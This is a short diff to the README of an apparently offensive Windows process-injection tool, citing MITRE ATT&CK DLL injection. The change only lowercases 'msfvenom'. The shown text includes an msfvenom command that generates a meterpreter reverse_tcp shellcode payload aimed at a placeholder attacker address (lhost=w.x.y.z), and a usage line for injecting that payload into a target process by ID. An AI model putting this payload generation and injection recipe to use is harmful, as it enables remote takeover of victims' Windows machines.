@@ -11,7 +11,7 @@ Process Injection: Dynamic-link Library Injection ==> https://attack.mitre.org/t
 --------------------------
 Your Payload Should be Msfvenom Payload ... 
 
-Msfvenom –platform windows –arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=w.x.y.z -f c > payload.txt
+msfvenom –platform windows –arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=w.x.y.z -f c > payload.txt
 -------------------------
 
     Code1: NativePayload_Tinjection.exe [TPID] [PAYLOAD]
